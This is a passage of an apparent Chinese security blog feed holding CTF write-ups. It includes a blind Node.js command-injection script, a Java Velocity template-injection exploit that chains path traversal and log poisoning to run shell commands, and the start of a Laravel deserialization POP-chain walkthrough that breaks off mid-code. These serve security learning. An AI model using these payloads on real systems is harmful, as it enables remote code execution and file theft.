class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://dusty.darkarmy.xyz/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js_exp</span><span class="params">(str1)</span>:</span></span><br><span class="line">    x=[]</span><br><span class="line">    str1 = str1.strip(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> str1:</span><br><span class="line">        x.append(str(ord(ch)))</span><br><span class="line">    t=<span class="string">','</span>.join(x)</span><br><span class="line">    result=<span class="string">'eval(String.fromCharCode('</span>+t+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        cmd = <span class="string">"""require('child_process').execSync(`if [ $(cat /flag.txt | cut -c &#123;&#125;) = '&#123;&#125;' ];then sleep 3;fi`)"""</span>.format(num,i)</span><br><span class="line">        payload = js_exp(cmd)</span><br><span class="line">        data = <span class="string">"""j:[&#123;"id":1,"body": ["1","1'-"""</span> + payload + <span class="string">""";//"]&#125;]"""</span></span><br><span class="line">        t = time.time()</span><br><span class="line">        r = requests.get(url, cookies=&#123;<span class="string">'note'</span>: quote(data)&#125;)</span><br><span class="line">        <span class="keyword">if</span> time.time() - t &gt; <span class="number">3</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag:<br><code>darkCTF{n0d3js_l1br4r13s_go3s_brrrr!}</code></p><p>因为一些格式原因。我把payload用eval转化了一下，这样看起来更舒服一些.并且不用担心奇奇怪怪的引号问题 :)</p><p>不过题目我觉得很有启发性，主要是给了我一些面对nodejs黑盒处理的手段。那就是利用其容易报错的特性进行FUZZ，得到目录这样的关键信息，或者是依赖的关键信息。同时一定程度上可以推测语句，甚至不需要知道依赖漏洞的细节就能直接上手。</p><p>最后道个歉，因为把flag写到css里后自己就把css给删了。导致后面题目一直没有style.css……</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>后面的题在打巅峰极客摸鱼时看了看。做了个入门题跟一个User-Agent的报错注入。总之难度整体很入门就没继续看了。<br>没啥说的。巅峰极客体验了一把带飞的感觉。国赛就要靠自己动手丰衣足食了。加油吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼城-zblog</title>
      <link href="2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/"/>
      <url>2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/</url>
      
        <content type="html"><![CDATA[<p>最近忙着复习去了。等到中午概统的复习课结束了才有时间完整看下题。除开一道web-pwn,剩下两个php都是常规考点,就是脑洞跟环境真心恶心人。学弟们也轻松解决，应该不需要什么记录。我自己做了下zblog这道java题,简单记录下。</p><a id="more"></a><p>最近ciscn赛区第7打进分区赛。强网杯跟着SU拿了第12。(就是自己太捞了,难题一律卡壳,果然不好好研究php跟java是没有出路的).然后为了国赛出了道Node.js不知道有没有机会拿到别的赛区去,估计真拿了会丢人吧。复习的时间也很少。不知道考试会不会炸……但是每次结束一个阶段总要写写文章的。所以形式化地写写。</p><h2 id="zblog"><a href="#zblog" class="headerlink" title="zblog"></a>zblog</h2><p>简单java.就是环境卡的要死。</p><p>title参数存在文件读取。后面看源码会发现是任意模板文件渲染的。<br>这里没记错的话有个小细节就是不能随便插<code>../</code>来穿越路径。后面会发现它是拼接路径的所以路径不能随便构造。而且似乎一开始尝试读文件的时候有点迷。文件末尾加了个<code>/</code>才能读到,不加读不到。不知道是什么神必操作。然后后来好像又给修好了？？？</p><p>总之fuzz一下可以找到根目录的位置读到<code>/etc/passwd</code>。接着读下<code>/proc/self/cmdline</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>个人觉得python跟java环境在有arbitary file read的情况下读下cmdline挺重要的。基本都会暴露绝对路径。比如此处。<br>更重要的是这个target.写过maven项目的都知道maven build好的内容都放在target文件夹下。所以这里基本确定能够确定按maven项目结构来读文件。</p><p>只要知道结构就等于把所有文件都暴露出来了。<br><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/0.PNG" alt><br>先读下pom.xml。发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporing.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporing.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-template-velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assemble<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从mainclass这里的值可以看出加载的主类Blog.class。按照maven默认没有包的结构直接读<code>../../../../src/main/java/Blog.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.Template;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> spark.template.velocity.VelocityTemplateEngine;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String fname, String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter writer = <span class="keyword">new</span> FileWriter(fname, <span class="keyword">true</span>);</span><br><span class="line">            writer.write(content);</span><br><span class="line">            writer.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</span><br><span class="line">        staticFiles.location(<span class="string">"/public"</span>);</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="string">"file"</span>);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="string">"/"</span>);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        get(<span class="string">"/"</span>, (request, response) -&gt; &#123;</span><br><span class="line">            request.session(<span class="keyword">true</span>);</span><br><span class="line">            String title = request.queryParams(<span class="string">"title"</span>);</span><br><span class="line">            <span class="keyword">if</span> (title != <span class="keyword">null</span>) &#123;</span><br><span class="line">                log(<span class="string">"/tmp/"</span> + request.session().id(), <span class="string">"Client IP: "</span> + request.ip() + <span class="string">" -&gt; File: "</span> + title + <span class="string">"\n"</span>);</span><br><span class="line">                Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/"</span> + title);</span><br><span class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">                template.merge(context, sw);</span><br><span class="line">                <span class="keyword">return</span> sw;</span><br><span class="line">            &#125;</span><br><span class="line">            Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/index"</span>);</span><br><span class="line">            StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">            template.merge(context, sw);</span><br><span class="line">            <span class="keyword">return</span> sw;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑是title参数除了会按值找到对应模板文件渲染。还会将参数按照sessionid存储到<code>tmp/</code>下。那么此处应该先传payload再进行渲染。即可触发ssti达成rce.<br>session为<code>node0wjq18duzt9pg4ddli5qyyfqn3034.node0</code>这种形式。id去掉<code>.node0</code>即可。</p><p>简单写个exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://122.112.253.135/'</span></span><br><span class="line"></span><br><span class="line">session=<span class="string">'node0wjq18duzt9pg4ddli5qyyfqn3034.node0'</span></span><br><span class="line">id=session.rstrip(<span class="string">'.node0'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">data=&#123;'title':'../../../../src/main/java/Blog.java'&#125;</span></span><br><span class="line"><span class="string">r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)</span></span><br><span class="line"><span class="string">print(r.text)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">data=&#123;<span class="string">'title'</span>:<span class="string">"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('grep -r flag /tmp')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"</span>&#125;</span><br><span class="line">r=requests.get(url,params=data,cookies=&#123;<span class="string">'JSESSIONID'</span>:session&#125;)</span><br><span class="line">data=&#123;<span class="string">'title'</span>:<span class="string">'../../../../../../../tmp/'</span>+id&#125;</span><br><span class="line">r=requests.get(url,params=data,cookies=&#123;<span class="string">'JSESSIONID'</span>:session&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>这个payload是找了个velocity回显的payload写的。逻辑上还是反射就不多说了。其实之前学习JavaSec那个项目里的sstipayload也能执行。但是似乎外带时有点问题。</p><p>唯一比较狗的就是flag在<code>/tmp</code>下。在tmp列目录会因为session文件太多进行相关操作直接卡死。一个个试发现最后只有<code>grep -r flag /tmp</code>不会卡。做完后发现换了个节点，flag放根目录了……</p><p>就这么多吧。希望新学期一切顺利。比赛成绩能更进一步。整个暑假学习的知识,做过的题，打过的比赛让这两个月没有荒废，收获还是挺大的。比较可惜的是本来打算跟完的Commoncollections几条链子以及jackson，shiro等等exp的原理没能全部完成。希望过段时间能把坑填了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel-popchain</title>
      <link href="2020/08/17/Laravel-popchain/"/>
      <url>2020/08/17/Laravel-popchain/</url>
      
        <content type="html"><![CDATA[<p>考虑了下还是打算把laravel的链子跟一遍。看了下基本上就5.7,5.8两个版本的rce反序列化popchain。所以工作量应该不大。正好最近完成tp系列的popchain学习审计代码的感觉还在,那就趁热打铁吧 。</p><a id="more"></a><p>关于代码获取:<br><code>composer create-project --prefer-dist laravel/laravel laravel58</code><br>后面加上<code>&quot;5.7.*&quot;</code>下载5.7版本的。</p><p>如果下载出错最好换下composer源。<br>之后可以直接<code>php artisan serve --host=0.0.0.0</code>.这样php-cli就会默认从8000端口监听起一个web服务。直接按照public对外显示。</p><p>然后默认关于laravel的一个命令行工具<code>artisan</code>。我个人认为审计代码的话如果是白盒审计看下路由,会用<code>php artisan route:list</code>就差不多了。<br>当然后面如果是开发的话肯定要全面学习下具体用法。</p><h2 id="laravel5-7-unserialize"><a href="#laravel5-7-unserialize" class="headerlink" title="laravel5.7-unserialize"></a>laravel5.7-unserialize</h2><p>首先我们需要添加路由与控制器代码给一个反序列化入手点。<br>routes/web.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">"/demo"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure><p>添加一个demo路由对应DemoController。所以直接在app/Http/Controllers下增添一个类DemoController。这样命名空间之类的也会自动生成好。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome to laravel5.7"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以通过demo路由进行参数传递。<br>exp尝试执行whoami</p><p><img src="/2020/08/17/Laravel-popchain/0.PNG" alt></p><p>接下来就是跟链子了。首先是入手点找<code>__destruct()</code>自不必说。<br>此处入手的destruct其实非常多。我们找到<code>src\Illuminate\Foundation\Testing\PendingCommand.php</code>。即 Illuminate/Foundation/Testing/PendingCommand类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;expectedExitCode, $exitCode,</span><br><span class="line">            <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $exitCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>终点其实就在run方法中<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>这句代码。关于它的真正含义我们先不去深究。从语义上看似乎是调用了内核进行call的命令执行。而它是在trycatch语句中执行的。所以需要在到这一不前都不会出现报错。</p><p>重点跟进mockConsoleOutput.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span 